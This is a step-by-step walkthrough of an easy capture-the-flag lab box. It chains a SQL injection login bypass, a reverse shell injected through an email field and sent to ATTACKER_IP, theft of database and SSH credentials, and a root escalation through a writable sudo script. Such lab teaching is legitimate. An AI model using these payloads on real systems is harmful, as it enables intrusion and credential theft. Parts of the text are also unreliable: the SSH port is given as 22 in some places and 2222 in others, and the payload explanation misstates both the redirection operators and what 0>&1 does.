# AM-01: The Lobby Terminal — Player Walkthrough

> **Difficulty:** Easy
> **Services:** HTTP (port 80), SSH (port 22)
> **Flags:** User flag + Root flag
> **Skills learned:** Nmap enumeration, SQL injection, command injection, database credential discovery, SSH lateral movement, sudo privilege escalation

This walkthrough teaches you how to compromise the Lobby Terminal step by step. Each section explains **what** to do and **why** it works, so you learn the underlying concepts rather than just copying commands.

---

## Prerequisites

- A Kali Linux VM (or any Linux machine with nmap, curl, nc, and sshpass installed)
- The target machine running and accessible (by default at `localhost` for dev, or `10.10.1.10` on the event VPN)

---

## Stage 1 — Reconnaissance with Nmap

**Goal:** Discover what services are running on the target.

**What is nmap?** Nmap ("Network Mapper") is a port scanner. It sends packets to a range of ports on a target machine and reports which ones are open — meaning a service is listening and ready to accept connections. The `-sV` flag tells nmap to also try to identify the service version; `-sC` runs default scripts that probe for common information.

```bash
nmap -sV -sC localhost
```

**Expected output:**
```
80/tcp  open  http    Apache httpd (Enrollment Portal)
2222/tcp  open  ssh     OpenSSH
```

**What we learned:** Two services are running:
- **Port 80 (HTTP):** A web server — Apache running a PHP application called the "Enrollment Portal"
- **Port 2222 (SSH):** An SSH server — we might be able to log in if we find credentials

**Why this matters:** In CTF, the first step is always enumeration. You can't attack what you don't know exists. We now know to focus on the web application (port 80) as our entry point.

---

## Stage 2 — Web Application Discovery

**Goal:** Explore the web application and find the login form.

Open your browser and navigate to `http://localhost/app/` (or the target IP). You should see the QUORUM Citizen Enrollment Portal — a login form asking for a username and password.

You can also use `curl` to view the page source from the command line:

```bash
curl http://localhost/app/index.php
```

**What we learned:** There's a login form at `/app/index.php`. If we can bypass the login, we get access to the dashboard.

---

## Stage 3 — SQL Injection Auth Bypass

**Goal:** Bypass the login form without knowing any credentials.

**What is SQL injection?** The login form takes your username and password and inserts them directly into a SQL query that checks the database. If the application doesn't properly sanitize the input (a very common vulnerability), we can craft special input that changes the meaning of the query.

The application's login query looks like this:

```sql
SELECT * FROM citizens WHERE username='$user' AND password='$pass'
```

If we enter `' OR 1=1 -- -` as the username, the query becomes:

```sql
SELECT * FROM citizens WHERE username='' OR 1=1 -- -' AND password='x'
```

**Why this works:**
- `'` closes the string literal
- `OR 1=1` is always true, so the WHERE clause matches ALL rows
- `-- -` is a SQL comment — everything after it is ignored (including the password check)

**Let's try it:**
```
Username: ' OR 1=1 -- -
Password: x
```

Or using curl:
```bash
curl -s -c cookies.txt -L -X POST \
  -d "username=%27+OR+1%3D1+--+-&password=x" \
  http://localhost/app/index.php
```

**Expected result:** You are redirected to `/app/dashboard.php` — you're logged in! The dashboard shows the first citizen record from the database.

**What we learned:** The login form is vulnerable to SQL injection. We bypassed authentication without knowing any credentials.

---

## Stage 4 — Second-Order Command Injection

**Goal:** Get a shell on the machine by exploiting the dashboard's "Update Contact Email" feature.

**What is command injection?** When an application passes user input to a system command without proper sensitization, an attacker can inject additional commands. The dashboard has a form that sends an email update, and the application runs:

```php
exec("echo '" . $email . "' | /usr/sbin/sendmail -t");
```

If we put a semicolon in the email field, we can run arbitrary commands after the `echo`.

First, set up a listener on your attacking machine to catch a reverse shell:

```bash
# On your attacker machine:
nc -lvnp 4444
```

**What is nc?** `nc` (netcat) is a utility that reads and writes data across network connections. `-l` tells it to listen (server mode), `-v` is verbose, `-n` skips DNS resolution, and `-p 4444` specifies the port. This creates a "listener" that will catch our reverse shell.

Now inject a reverse shell via the email field. In the dashboard, submit this as the email:

```
'; bash -c "bash -i > /dev/tcp/ATTACKER_IP/4444 0>&1" #
```

Replace `ATTACKER_IP` with your attacking machine's IP address.

**What does this payload do?**
- `;` ends the original `echo` command
- `bash -c '...'` starts a new bash shell
- `bash -i` makes it interactive
- `>& /dev/tcp/ATTACKER_IP/4444` redirects input and output to your listener
- `0>&1` redirects stderr to stdout

**Expected result:** You now have a shell on the target machine as the `www-data` user (the user that Apache runs as).

---

## Stage 5 — Database Credential Discovery

**Goal:** Find database credentials that let us discover SSH login info.

As `www-data`, we can read the application's configuration file, which contains the database password:

```bash
cat /var/www/html/app/config.php
```

**Expected output:**
```php
$db_user = 'lobby_app';
$db_pass = 'lobby_app_sql_pass_2026';
```

**Why this matters:** Web applications often store database credentials in config files. As the web server user (`www-data`), we have permission to read these files. Now we can connect to the database and look for useful information.

Connect to the database and dump the login table:

```bash
mysql -u lobby_app -p'lobby_app_sql_pass_2026' lobby -e 'SELECT * FROM login;'
```

**Expected output:**
```
+----+------------+----------------------------------+
| id | username   | password                         |
+----+------------+----------------------------------+
|  1 | compliance | WinterCaseSensitiveShallNotPass! |
+----+------------+----------------------------------+
```

**What we learned:** We found SSH credentials — username `compliance` with password `WinterCaseSensitiveShallNotPass!`

---

## Stage 6 — SSH Lateral Movement + User Flag

**Goal:** Use the discovered credentials to log in via SSH and find the user flag.

```bash
ssh compliance@localhost -p 2222
```

**What is sshpass?** `sshpass` lets you provide an SSH password non-interactively (useful in CTF). In a real engagement, you'd just use `ssh compliance@localhost` and type the password.

Once logged in, read the user flag:

```bash
cat ~/user.txt
```

**Expected output:**
```
DZ{user_lobby_PLACEHOLDER}
```

(Your actual flag value will be different — it's generated per event.)

**What we learned:** We moved from a low-privilege web shell (`www-data`) to a proper user account (`compliance`) by finding credentials in the database. This is called "lateral movement" — pivoting from one account to another.

---

## Stage 7 — Privilege Escalation via sudo

**Goal:** Escalate from the `compliance` user to root and read the root flag.

**What is privilege escalation?** Gaining higher-level permissions than you currently have. The goal is to go from a regular user to root (the superuser).

First, check what sudo privileges the `compliance` user has:

```bash
sudo -l
```

**Expected output:**
```
User compliance may run the following commands:
    (ALL) NOPASSWD: /usr/local/bin/run_audit.sh
```

**What this means:** The `compliance` user can run `/usr/local/bin/run_audit.sh` as root without a password. If we can modify that script, we can run arbitrary commands as root.

Check the file permissions:

```bash
ls -l /usr/local/bin/run_audit.sh
```

**Expected output:**
```
-rwxrwxrwx 1 root root ... /usr/local/bin/run_audit.sh
```

**The vulnerability:** The file is world-writable (`rwxrwxrwx`) — any user can modify it. This is an intentional misconfiguration (in the story, "Directors may update the audit tool").

Overwrite the script to read the root flag, then run it with sudo:

```bash
echo '#!/bin/bash
cat /root/root.txt' > /usr/local/bin/run_audit.sh

sudo /usr/local/bin/run_audit.sh
```

**Expected output:**
```
DZ{root_lobby_PLACEHOLDER}
```

**What we learned:** We escalated to root by abusing a world-writable script that we were allowed to run via sudo. The key was checking `sudo -l` and then examining file permissions on the script it referenced.

---

## Summary

Here's the complete exploit chain we followed:

| Step | Technique | What we did |
|------|-----------|-------------|
| 1 | Nmap enumeration | Discovered HTTP (80) and SSH (22) |
| 2 | SQL injection | Bypassed the login form with `' OR 1=1 -- -` |
| 3 | Command injection | Injected a reverse shell via the email field |
| 4 | Config file discovery | Read DB credentials from `config.php` |
| 5 | Database dump | Found SSH credentials in the `login` table |
| 6 | SSH lateral movement | Logged in as `compliance`, got the user flag |
| 7 | sudo privesc | Overwrote a world-writable script run via sudo, got root flag |

**Key takeaways for new CTF players:**
- **Always enumerate first.** Nmap is your first step on any target.
- **Web forms are common entry points.** Try SQL injection on login forms.
- **Config files contain secrets.** Always look for database credentials, API keys, and passwords in config files.
- **Check sudo permissions.** `sudo -l` is one of the first commands to run once you have a shell.
- **World-writable files are dangerous.** If a script is writable and runs as root, you own the machine.
